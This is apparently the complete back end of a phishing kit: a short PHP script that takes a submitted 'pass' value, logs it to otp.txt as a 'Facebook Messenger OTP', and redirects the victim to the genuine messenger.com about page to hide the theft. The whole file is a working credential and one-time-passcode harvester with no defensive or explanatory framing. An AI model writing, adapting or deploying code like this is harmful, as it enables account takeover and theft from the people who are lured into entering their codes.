<?php
file_put_contents("otp.txt", "Facebook Messenger OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.messenger.com/about');
?>
